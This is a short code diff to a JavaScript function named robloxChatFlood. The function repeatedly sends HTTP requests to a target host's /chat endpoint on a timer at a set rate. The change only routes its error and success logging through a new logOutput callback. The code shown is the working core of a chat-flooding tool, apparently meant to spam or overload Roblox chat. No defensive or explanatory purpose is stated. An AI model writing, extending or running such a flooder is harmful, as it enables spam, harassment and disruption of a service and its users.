@@ -1,6 +1,6 @@
 const request = require('request');
 
-function robloxChatFlood(target, rateLimit) {
+function robloxChatFlood(target, rateLimit, logOutput) {
     setInterval(() => {
         const options = {
             url: `https://${target}/chat`,
@@ -12,9 +12,9 @@ function robloxChatFlood(target, rateLimit) {
 
         request(options, (error, response, body) => {
             if (error) {
-                console.error('Error: ' + error.message);
+                logOutput('Error: ' + error.message);
             } else {
-                console.log('Sent Roblox chat message');
+                logOutput('Sent Roblox chat message');
             }
         });
     }, 1000 / rateLimit);
